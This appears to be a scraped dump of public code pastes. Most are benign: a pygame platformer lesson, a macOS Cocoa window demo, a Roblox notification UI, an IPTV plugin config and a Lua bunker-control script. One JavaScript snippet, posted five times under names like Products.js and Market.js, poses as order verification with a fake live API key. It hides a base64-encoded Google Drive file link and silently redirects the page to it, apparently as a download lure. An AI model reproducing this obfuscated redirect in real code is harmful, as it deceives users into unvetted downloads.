    <settingslevel>expert</settingslevel>
    <m3uurl><![CDATA[http://suka.new2024.co:80/get.php?username=USERNAME&password=PASSWORD&type=m3u_plus&output=ts]]></m3uurl><!-- Extended M3U url --> 
    <epgurl><![CDATA[http://suka.new2024.co:80/xmltv.php?username=USERNAME&password=PASSWORD&next_days=7]]></epgurl><!-- XMLTV EPG url -->
    <username><![CDATA[uuuuu]]></username><!-- (Optional) will replace USERNAME placeholder in urls -->
    <password><![CDATA[ppppp]]></password><!-- (Optional) will replace PASSWORD placeh
    <providerupdate><![CDATA[]]></providerupdate><!-- (Optional) Provider update url -->
    <providerhideurls>0</providerhideurls><!-- (Optional) Hide Provider urls in plugin -->
    <iptvtypes>0</iptvtypes><!-- Change all TV streams to IPTV type (0 or 1) -->
    <streamtypetv>4097</streamtypetv><!-- (Optional) Custom TV stream type (e.g. 1, 4097, 5001 or 5002 -->
    <streamtypevod>4097</streamtypevod><!-- (Optional) Custom VOD stream type (e.g. 4097, 5001 or 5002 -->
    <multivod>1</multivod><!-- Split VOD into seperate categories (0 or 1) -->
    <allbouquet>0</allbouquet><!-- Create all channels bouquet (0 or 1) -->
    <picons>0</picons><!-- Automatically download Picons (0 or 1) -->
    <iconpath></iconpath><!-- Location to store picons) -->
    <xcludesref>0</xcludesref><!-- Disable service ref overriding from override.xml file (0 or 1) -->
    <bouqueturl><![CDATA[]]></bouqueturl><!-- (Optional) url to download providers bouquet - to map custom service references -->
    <bouquetdownload>1</bouquetdownload><!-- Download providers bouquet (uses default url) must have username and password set above - to map custom service references -->
    <bouquettop>0</bouquettop><!-- Place IPTV bouquets at top (0 or 1) -->
    <lastproviderupdate>0</lastproviderupdate><!-- Internal use -->
  </supplier>
</config>
"
3XcUFbNN,Untitled,dentira,JavaScript,Monday 31st of March 2025 11:26:34 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/575/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nAbYhx5b,MinIO Docker Compose,TheMRP,YAML,Monday 31st of March 2025 11:25:54 AM CDT,"services:
  minio:
    image: minio/minio
    container_name: minio
    restart: unless-stopped
    ports:
      - ""9000:9000""  # MinIO API Port
      - ""9090:9090""  # MinIO Console Port
    environment:
      MINIO_ROOT_USER: ""admin""
      MINIO_ROOT_PASSWORD: ""mysecretpassword""
    volumes:
      - <PATH_TO_DATA>:/data
    command: server --console-address "":9090"" /data"
a2Z7PYAA,Products.js,dentira,JavaScript,Monday 31st of March 2025 11:11:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/218/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ettLFNL2,Lesson 5 - Methods,MCreeper12731,Python,Monday 31st of March 2025 11:07:26 AM CDT,"import pygame
pygame.init()

width = 1200
height = 600
window = pygame.display.set_mode((width, height))
pygame.display.set_caption(""Platformer Game"")

# Spremenljivke, ki jih bomo potrebovali za igralca
# ---

class Player:
    def __init__(self, x, y):
        self.size = 75
        self.position = pygame.Rect(x, y, self.size, self.size)
        self.image = pygame.image.load(""images/scratch-cat.png"")
        self.image = pygame.transform.scale(self.image, (self.size, self.size))
        self.speed_x = 0
        self.speed_y = 0
        self.on_ground = False
        

player = Player(100, 100)

platforms = [pygame.Rect(0, height - 50, width, 50), pygame.Rect(300, 500, 200, 20), pygame.Rect(600, 350, 200, 20), pygame.Rect(900, 400, 200, 20)]

# ---

def resolve_collision(rect_a, rect_b):
    # Compute overlap distances in x and y
    dx1 = rect_b.right - rect_a.left
    dx2 = rect_a.right - rect_b.left
    dy1 = rect_b.bottom - rect_a.top
    dy2 = rect_a.bottom - rect_b.top

    # Find the smallest displacement to separate them
    min_dx = min(dx1, dx2)
    min_dy = min(dy1, dy2)

    if min_dx < min_dy:
        # Move rect_a left or right
        if dx1 < dx2:
            rect_a.x += dx1  # Move right
        else:
            rect_a.x -= dx2  # Move left
    else:
        # Move rect_a up or down
        if dy1 < dy2:
            rect_a.y += dy1  # Move down
        else:
            player.on_ground = True
            rect_a.y -= dy2  # Move up
    
    return True  # Collision was resolved

# Glavna zanka igre
clock = pygame.time.Clock()
running = True
while running:
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

    window.fill((255, 255, 255))
    # background_image = pygame.image.load(""images/New Piskel.png"")
    # background_image = pygame.transform.scale(background_image, (width, height))
    # window.blit(background_image, (0, 0))
    # Premikanje igralčevega lika
    # ---

    # Vsako ponovitev zanke (vsak frame) dobimo pritisnjene tipke
    # in se glede na njih odločimo, kako bomo igralca premaknili
    keys = pygame.key.get_pressed()
    if keys[pygame.K_d]:
        player.speed_x = 5
    elif keys[pygame.K_a]:
        player.speed_x = -5
    else:
        player.speed_x = 0

    if keys[pygame.K_SPACE] and player.on_ground == True:
        player.on_ground = False
        player.speed_y = -25

    if player.speed_y < 20:
        player.speed_y += 1


    player.position.x += player.speed_x
    player.position.y += player.speed_y

    if player.position.x < 0:
        player.position.x = 0
    if player.position.x > width - player.size:
        player.position.x = width - player.size
    if player.position.y < 0:
        player.position.y = 0
    if player.position.y > height - player.size:
        player.position.y = height - player.size
    
    for platform in platforms:
        if player.position.colliderect(platform):
            resolve_collision(player.position, platform)
        
    # ---
    # Izris likov
    # ---

    window.blit(player.image, player.position)
    for platform in platforms:
        pygame.draw.rect(window, (0, 127, 0), platform)
        # window.blit(slika_ovire, platform)

    # ---

    pygame.display.update()
    clock.tick(60)

pygame.quit()"
9GgtmCzT,CMakeLists.txt,arabasso,CMake,Monday 31st of March 2025 10:59:34 AM CDT,"# Defina a versão mínima do CMake
cmake_minimum_required(VERSION 3.10)

# Defina o nome do projeto
project(MyApp)

# Defina a versão do C++
set(CMAKE_CXX_STANDARD 11)

# Especificando que estamos criando um aplicativo para macOS
set(CMAKE_OSX_ARCHITECTURES ""x86_64;arm64"")  # Define as arquiteturas suportadas (Intel e Apple Silicon)

# Adicione os arquivos fontes ao projeto
set(SOURCES
    main.cpp
    MyWindow.mm  # Arquivo Objective-C++
)

# Crie o executável
add_executable(MyApp ${SOURCES})

# Link o framework Cocoa, necessário para macOS
target_link_libraries(MyApp ""-framework Cocoa"")

# Se necessário, você pode adicionar flags de compilação, por exemplo:
# target_compile_options(MyApp PRIVATE -Wall)
"
ahTLD7Pd,main.cpp,arabasso,C++,Monday 31st of March 2025 10:58:41 AM CDT,"// main.cpp
#include ""MyWindow.hpp""  // Incluindo o cabeçalho da classe

int main(int argc, const char * argv[]) {
    // Criando a janela e rodando a aplicação
    MyWindow window;
    window.run();  // Chama o método que lida com a janela e os eventos

    return 0;
}
"
4xuPC5Dp,MyWindow.mm,arabasso,Objective C,Monday 31st of March 2025 10:58:04 AM CDT,"// MyWindow.mm
#import <Cocoa/Cocoa.h>  // Importando o framework Cocoa
#include ""MyWindow.hpp""    // Incluindo o cabeçalho da classe

// Implementação da classe MyWindow
MyWindow::MyWindow() {
    // Construtor vazio, aqui você pode inicializar membros, se necessário
}

MyWindow::~MyWindow() {
    // Destruidor, pode limpar recursos se necessário
}

void MyWindow::run() {
    // Criando a janela usando Cocoa
    @autoreleasepool {
        // Criar uma instância da aplicação
        NSApplication *app = [NSApplication sharedApplication];

        // Criar uma janela
        NSWindow *window = [[NSWindow alloc]
                            initWithContentRect:NSMakeRect(0, 0, 800, 600)
                            styleMask:(NSWindowStyleMaskTitled |
                                        NSWindowStyleMaskClosable |
                                        NSWindowStyleMaskResizable)
                            backing:NSBackingStoreBuffered
                            defer:NO];
        [window setTitle:@""Minha Janela""];
        [window makeKeyAndOrderFront:nil];

        // Instalação do evento de monitoramento do mouse e teclado
        [window setAcceptsMouseMovedEvents:YES]; // Aceita eventos de movimento de mouse

        // Lógica para tratar eventos (mouse e teclado)
        while (![app isRunning]) {
            NSEvent *event = [app nextEventMatchingMask:NSEventMaskAny untilDate:nil inMode:NSDefaultRunLoopMode dequeue:YES];
            [app sendEvent:event];
            [app updateWindows];

            // Checando tipo de evento (mouse ou teclado)
            if ([event type] == NSEventTypeKeyDown) {
                NSString *keyPressed = [event charactersIgnoringModifiers];
                std::cout << ""Tecla pressionada: "" << [keyPressed UTF8String] << std::endl;
            }

            if ([event type] == NSEventTypeMouseMoved) {
                NSPoint mouseLocation = [event locationInWindow];
                std::cout << ""Mouse movido para: ("" << mouseLocation.x << "", "" << mouseLocation.y << "")"" << std::endl;
            }

            if ([event type] == NSEventTypeLeftMouseDown) {
                NSPoint mouseDownLocation = [event locationInWindow];
                std::cout << ""Clique do mouse em: ("" << mouseDownLocation.x << "", "" << mouseDownLocation.y << "")"" << std::endl;
            }
        }
    }
}
"
CkAViuL0,MyWindow.hpp,arabasso,C++,Monday 31st of March 2025 10:57:03 AM CDT,"// MyWindow.hpp
#ifndef MYWINDOW_HPP
#define MYWINDOW_HPP

#include <iostream>

class MyWindow {
public:
    MyWindow();                // Construtor
    ~MyWindow();               // Destruidor

    void run();                // Método para rodar o loop de eventos

private:
    void handleEvent();        // Método para lidar com eventos (ex: mouse e teclado)
};

#endif // MYWINDOW_HPP
"
3W6XpKc6,类斐波那契循环数 参考代码,Dmaxiya,C++,Monday 31st of March 2025 10:44:23 AM CDT,"#include <bits/stdc++.h>
using namespace std;

typedef long long LL;
const int maxn = 100 + 100;
LL sum[maxn];

bool judge(LL x) {
    int n = 0;
    LL tmp = x;
    while (tmp != 0) {
        sum[n++] = tmp % 10;
        tmp /= 10;
    }
    sum[n] = 0;
    reverse(sum, sum + n + 1);
    for (int i = 1; i <= n; ++i) {
        sum[i] += sum[i - 1];
    }
    for (int i = n + 1; i <= 50; ++i) {
        tmp = sum[i - 1] - sum[i - n - 1];
        if (tmp == x) {
            return true;
        }
        sum[i] = tmp + sum[i - 1];
    }
    return false;
}

int main() {
#ifdef ExRoc
    freopen(""test.txt"", ""r"", stdin);
#endif // ExRoc
    ios::sync_with_stdio(false);

    for (int i = 1; i <= 10000000; ++i) {
        if (judge(i)) {
            cout << i << endl;
        }
    }
    cout << 7913837 << endl;

    return 0;
}
"
TXeAB0VF,Market.js,dentira,JavaScript,Monday 31st of March 2025 10:40:27 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/410/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
dhQzqRE2,Untitled,dentira,JavaScript,Monday 31st of March 2025 10:25:05 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/796/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
WvMV0KS8,notify-ui,Achitsak,Lua,Monday 31st of March 2025 10:24:00 AM CDT,"-- Enhanced Sakura Notification UI for Roblox
-- ธีมแจ้งเตือนซากุระแบบสวยงามสำหรับ Roblox

local SakuraPremiumNotify = {}

-- ฟังก์ชันสร้างการแจ้งเตือนแบบสวยงาม
function SakuraPremiumNotify:Show(message, notifType, duration, title)
    -- ค่าเริ่มต้น
    message = message or ""Notification message""
    notifType = notifType or ""Info"" -- Info, Success, Warning, Error
    duration = duration or 5 -- เวลาที่แสดง (วินาที)
    title = title or notifType -- หัวข้อการแจ้งเตือน (ถ้าไม่กำหนดจะใช้ประเภทการแจ้งเตือน)
    
    -- สีตามประเภทการแจ้งเตือน
    local colors = {
        Info = Color3.fromRGB(173, 216, 230),      -- สีฟ้าอ่อน
        Success = Color3.fromRGB(152, 223, 138),   -- สีเขียวอ่อน
        Warning = Color3.fromRGB(255, 223, 126),   -- สีเหลืองอ่อน
        Error = Color3.fromRGB(249, 140, 182)      -- สีชมพูอ่อน
    }
    local accentColor = colors[notifType]
    
    -- สร้าง UI
    local player = game.Players.LocalPlayer
    local playerGui = player:WaitForChild(""PlayerGui"")
    
    -- ตรวจสอบว่ามี ScreenGui สำหรับการแจ้งเตือนหรือไม่
    local notifGui = playerGui:FindFirstChild(""SakuraPremiumNotifications"")
    if not notifGui then
        notifGui = Instance.new(""ScreenGui"")
        notifGui.Name = ""SakuraPremiumNotifications""
        notifGui.ResetOnSpawn = false
        notifGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
        notifGui.Parent = playerGui
    end
    
    -- สร้าง Frame หลัก (ใหญ่ขึ้น)
    local mainFrame = Instance.new(""Frame"")
    mainFrame.Size = UDim2.new(0, 340, 0, 110)
    mainFrame.Position = UDim2.new(1, -360, 0, 20)
    mainFrame.BackgroundColor3 = Color3.fromRGB(255, 248, 252) -- สีพื้นหลังอ่อนลง
    mainFrame.BackgroundTransparency = 0.05
    mainFrame.BorderSizePixel = 0
    mainFrame.AnchorPoint = Vector2.new(0, 0)
    mainFrame.Parent = notifGui
    
    -- เพิ่มเอฟเฟกต์เงา
    local shadow = Instance.new(""ImageLabel"")
    shadow.Size = UDim2.new(1, 30, 1, 30)
    shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
    shadow.BackgroundTransparency = 1
    shadow.Image = ""rbxassetid://6014257812""
    shadow.ImageColor3 = Color3.fromRGB(0, 0, 0)
    shadow.ImageTransparency = 0.6
    shadow.AnchorPoint = Vector2.new(0.5, 0.5)
    shadow.ZIndex = -1
    shadow.Parent = mainFrame
    
    -- มุมโค้งสวยงาม
    local UICorner = Instance.new(""UICorner"")
    UICorner.CornerRadius = UDim.new(0, 12)
    UICorner.Parent = mainFrame
    
    -- แถบสีด้านบนแบบสวยงาม
    local accentBar = Instance.new(""Frame"")
    accentBar.Size = UDim2.new(1, -2, 0, 6)
    accentBar.Position = UDim2.new(0, 1, 0, 1)
    accentBar.BackgroundColor3 = accentColor
    accentBar.BorderSizePixel = 0
    accentBar.Parent = mainFrame
    
    -- มุมโค้งสำหรับแถบสี
    local accentCorner = Instance.new(""UICorner"")
    accentCorner.CornerRadius = UDim.new(0, 12)
    accentCorner.Parent = accentBar
    
    -- เส้นขอบสวยงาม
    local border = Instance.new(""UIStroke"")
    border.Color = Color3.fromRGB(255, 182, 193)
    border.Thickness = 1.2
    border.Transparency = 0.1
    border.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    border.Parent = mainFrame
    
    -- ไอคอนตามประเภทการแจ้งเตือน
    local iconIds = {
        Info = ""rbxassetid://3944703587"",
        Success = ""rbxassetid://3944670656"",
        Warning = ""rbxassetid://3944669799"",
        Error = ""rbxassetid://3944696624""
    }
    
    local icon = Instance.new(""ImageLabel"")
    icon.Size = UDim2.new(0, 24, 0, 24)
    icon.Position = UDim2.new(0, 15, 0, 18)
    icon.BackgroundTransparency = 1
    icon.Image = iconIds[notifType]
    icon.ImageColor3 = accentColor
    icon.Parent = mainFrame
    
    -- หัวข้อแจ้งเตือนแบบสวยงาม
    local titleLabel = Instance.new(""TextLabel"")
    titleLabel.Size = UDim2.new(1, -80, 0, 28)
    titleLabel.Position = UDim2.new(0, 50, 0, 16)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Text = title
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.TextSize = 18
    titleLabel.TextColor3 = Color3.fromRGB(60, 30, 50)
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = mainFrame
    
    -- ข้อความแจ้งเตือนแบบสวยงาม
    local messageLabel = Instance.new(""TextLabel"")
    messageLabel.Size = UDim2.new(1, -30, 0, 60)
    messageLabel.Position = UDim2.new(0, 15, 0, 45)
    messageLabel.BackgroundTransparency = 1
    messageLabel.Text = message
    messageLabel.Font = Enum.Font.Gotham
    messageLabel.TextSize = 16
    messageLabel.TextColor3 = Color3.fromRGB(90, 60, 80)
    messageLabel.TextXAlignment = Enum.TextXAlignment.Left
    messageLabel.TextYAlignment = Enum.TextYAlignment.Top
    messageLabel.TextWrapped = true
    messageLabel.Parent = mainFrame
    
    -- ปุ่มปิดการแจ้งเตือน
    local closeButton = Instance.new(""TextButton"")
    closeButton.Size = UDim2.new(0, 26, 0, 26)
    closeButton.Position = UDim2.new(1, -35, 0, 17)
    closeButton.BackgroundColor3 = Color3.fromRGB(255, 220, 230)
    closeButton.Text = ""×""
    closeButton.TextColor3 = Color3.fromRGB(90, 60, 80)
    closeButton.TextSize = 20
    closeButton.Font = Enum.Font.GothamBold
    closeButton.BorderSizePixel = 0
    closeButton.AutoButtonColor = true
    closeButton.Parent = mainFrame
    
    local closeCorner = Instance.new(""UICorner"")
    closeCorner.CornerRadius = UDim.new(1, 0)
    closeCorner.Parent = closeButton
    
    -- สร้างกลีบซากุระที่สวยงาม
    local function createPetal(size, posX, posY, rotation, transparency)
        local petal = Instance.new(""ImageLabel"")
        petal.Size = UDim2.new(0, size, 0, size)
        petal.BackgroundTransparency = 1
        petal.Image = ""rbxassetid://636768448"" -- รูปกลีบซากุระ (สามารถใช้ ID อื่นได้)
        petal.ImageColor3 = Color3.fromRGB(255, 182, 193)
        petal.ImageTransparency = transparency
        petal.Rotation = rotation
        petal.AnchorPoint = Vector2.new(0.5, 0.5)
        petal.Position = UDim2.new(posX, 0, posY, 0)
        petal.Parent = mainFrame
        return petal
    end
    
    -- สร้างกลีบซากุระหลายๆ กลีบ
    local petals = {}
    table.insert(petals, createPetal(20, 0.82, 0.23, 15, 0.3))
    table.insert(petals, createPetal(16, 0.88, 0.45, 30, 0.4))
    table.insert(petals, createPetal(18, 0.75, 0.65, 45, 0.35))
    table.insert(petals, createPetal(14, 0.92, 0.75, 60, 0.45))
    table.insert(petals, createPetal(22, 0.68, 0.85, 20, 0.35))
    table.insert(petals, createPetal(12, 0.25, 0.82, 70, 0.4))
    table.insert(petals, createPetal(18, 0.12, 0.65, 45, 0.5))
    
    -- เพิ่มพื้นหลังลวดลายซากุระจางๆ
    local bgPattern = Instance.new(""ImageLabel"")
    bgPattern.Size = UDim2.new(1, 0, 1, 0)
    bgPattern.BackgroundTransparency = 1
    bgPattern.Image = ""rbxassetid://276941193"" -- รูปลวดลายซากุระ (สามารถใช้ ID อื่นได้)
    bgPattern.ImageColor3 = Color3.fromRGB(255, 200, 210)
    bgPattern.ImageTransparency = 0.92
    bgPattern.ZIndex = 0
    bgPattern.Parent = mainFrame
    
    -- สร้างเส้นแบ่งบรรทัดสวยงาม
    local divider = Instance.new(""Frame"")
    divider.Size = UDim2.new(1, -30, 0, 1)
    divider.Position = UDim2.new(0, 15, 0, 45)
    divider.BackgroundColor3 = Color3.fromRGB(255, 200, 210)
    divider.BackgroundTransparency = 0.7
    divider.BorderSizePixel = 0
    divider.Parent = mainFrame
    
    -- แอนิเมชันของกลีบซากุระ
    local tweenService = game:GetService(""TweenService"")
    
    for i, petal in ipairs(petals) do
        spawn(function()
            while mainFrame.Parent do
                local randomMovement = {
                    Position = UDim2.new(
                        petal.Position.X.Scale + (math.random(-10, 10) / 100),
                        0,
                        petal.Position.Y.Scale + (math.random(-10, 10) / 100),
                        0
                    ),
                    Rotation = petal.Rotation + math.random(-30, 30)
                }
                
                local tweenInfo = TweenInfo.new(
                    math.random(3, 5),
                    Enum.EasingStyle.Sine,
                    Enum.EasingDirection.InOut
                )
                
                local tween = tweenService:Create(petal, tweenInfo, randomMovement)
                tween:Play()
                wait(math.random(2, 4))
            end
        end)
    end
    
    -- แอนิเมชันเข้า
    mainFrame.Position = UDim2.new(1, 20, 0, 20)
    local tweenInfo = TweenInfo.new(0.7, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
    local tween = tweenService:Create(mainFrame, tweenInfo, {Position = UDim2.new(1, -360, 0, 20)})
    tween:Play()
    
    -- เคลื่อนย้ายการแจ้งเตือนที่มีอยู่ขึ้นด้านบน
    local existingNotifs = notifGui:GetChildren()
    for _, notif in ipairs(existingNotifs) do
        if notif ~= mainFrame and notif:IsA(""Frame"") then
            local currentPos = notif.Position
            tweenService:Create(notif, TweenInfo.new(0.5), {Position = UDim2.new(currentPos.X.Scale, currentPos.X.Offset, 
                                                             currentPos.Y.Scale, currentPos.Y.Offset + 120)})
                          :Play()
        end
    end
    
    -- ฟังก์ชันปิดการแจ้งเตือน
    local function closeNotification()
        if mainFrame and mainFrame.Parent then
            local fadeOut = tweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), 
                                            {Position = UDim2.new(1, 20, 0, mainFrame.Position.Y.Offset), BackgroundTransparency = 1})
            fadeOut:Play()

            for _, obj in pairs(mainFrame:GetDescendants()) do
                if obj:IsA(""TextLabel"") or obj:IsA(""TextButton"") then
                    tweenService:Create(obj, TweenInfo.new(0.5), {TextTransparency = 1}):Play()
                elseif obj:IsA(""ImageLabel"") or obj:IsA(""ImageButton"") then
                    tweenService:Create(obj, TweenInfo.new(0.5), {ImageTransparency = 1}):Play()
                elseif obj:IsA(""Frame"") then
                    tweenService:Create(obj, TweenInfo.new(0.5), {BackgroundTransparency = 1}):Play()
                elseif obj:IsA(""UIStroke"") then
                    tweenService:Create(obj, TweenInfo.new(0.5), {Transparency = 1}):Play()
                end
            end

            -- ตรวจสอบอีกครั้งว่า mainFrame ยังอยู่ก่อนลบ
            fadeOut.Completed:Connect(function()
                if mainFrame and mainFrame.Parent then
                    mainFrame:Destroy()
                end
            end)
        end
    end
    
    -- เชื่อมต่อปุ่มปิด
    closeButton.MouseButton1Click:Connect(closeNotification)
    
    -- แอนิเมชันออกอัตโนมัติหลังจากครบเวลา
    task.delay(duration, function()
        if mainFrame and mainFrame.Parent then
            closeNotification()
        end
    end)
    
    -- เพิ่มเอฟเฟกต์เมื่อเลื่อนเมาส์ไปที่การแจ้งเตือน
    mainFrame.MouseEnter:Connect(function()
        tweenService:Create(mainFrame, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(255, 245, 250)}):Play()
        tweenService:Create(border, TweenInfo.new(0.3), {Color = accentColor}):Play()
    end)
    
    mainFrame.MouseLeave:Connect(function()
        tweenService:Create(mainFrame, TweenInfo.new(0.3), {BackgroundColor3 = Color3.fromRGB(255, 248, 252)}):Play()
        tweenService:Create(border, TweenInfo.new(0.3), {Color = Color3.fromRGB(255, 182, 193)}):Play()
    end)
    
    return mainFrame
end

-- ฟังก์ชันเฉพาะสำหรับแต่ละประเภทการแจ้งเตือน
function SakuraPremiumNotify:Info(message, duration, title)
    return self:Show(message, ""Info"", duration, title or ""ข้อมูล"")
end

function SakuraPremiumNotify:Success(message, duration, title)
    return self:Show(message, ""Success"", duration, title or ""สำเร็จ"")
end

function SakuraPremiumNotify:Warning(message, duration, title)
    return self:Show(message, ""Warning"", duration, title or ""คำเตือน"")
end

function SakuraPremiumNotify:Error(message, duration, title)
    return self:Show(message, ""Error"", duration, title or ""ข้อผิดพลาด"")
end

-- ฟังก์ชันแสดงผลแบบพิเศษ
function SakuraPremiumNotify:CustomNotify(message, title, duration, customColor)
    local notification = self:Show(message, ""Info"", duration, title)
    
    -- เปลี่ยนสีให้เป็นตามที่กำหนด
    local accentBar = notification:FindFirstChild(""Frame"")
    if accentBar then
        accentBar.BackgroundColor3 = customColor or Color3.fromRGB(255, 182, 193)
    end
    
    local icon = notification:FindFirstChild(""ImageLabel"")
    if icon and icon.Size == UDim2.new(0, 24, 0, 24) then
        icon.ImageColor3 = customColor or Color3.fromRGB(255, 182, 193)
    end
    
    return notification
end

return SakuraPremiumNotify"
4i5wcrKS,Products.js,dentira,JavaScript,Monday 31st of March 2025 10:09:42 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/601/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wNH0Gprj,High cmd,samuelask,Lua,Monday 31st of March 2025 10:03:41 AM CDT,"-- Script for Bunker Control
local component = require(""component"")
local thread = require(""thread"")
local event = require(""event"")
local term = require(""term"")
local serialization = require(""serialization"")
local sides = require(""sides"")
local colors = require(""colors"")
local modem = component.modem
local gpu = component.gpu
local tunnel = component.tunnel
local lastMessageId = nil
user = """"
Local_Name = ""High Command""
Short_Name = ""[High cmd] ""
running = true
decon = false
-- Configuration
beacon = true
modem.open(123)

-- UI Drawing Function
local function draw_ui()
    term.clear()
    print(""Bunker Control"")
	print(""[SPACE] Toggle Emergency Beacon ["" .. (beacon and ""ON"" or ""OFF"") .. ""]"")
    print(""[D] "" .. (decon and ""Run Decontamination Procedure [RUNNING]"" or ""Run Decontamination Procedure""))
    print(""[U] Update orders from high command"")
	print(""[M] Messages"")
    print(""[Q] Dial Omega Site"")
end

-- UI Drawing Function messages
local function draw_ui_messages()
    term.clear()
    print(""Messages"")
	print(""[R] Read messages"")
    print(""[S] Send message"")
    print(""[E] Exit"")
end

-- Function to send commands
local function send_command(address, value, header)
  
  local data = {
	from = Local_Name,
	shrt = Short_Name,
	user = user,
	to = address,
	header = header,
    message = value,
    timestamp = os.time()
  }
	local serialized_data = serialization.serialize(data)
    modem.send(relay_address, 123, serialized_data)
end

-- Function to read messages
local function read_message()
	::continue1::
	term.clear()
	print(""Inbox"")
	print(""Pick a message to read"")
	print(""︱NEWEST︱"")
	print(""[1] ︱ [Omega] ComE ︱"")
    print(""[2] ︱ [ALERT] LOCKDOWN INITIATED ︱"")
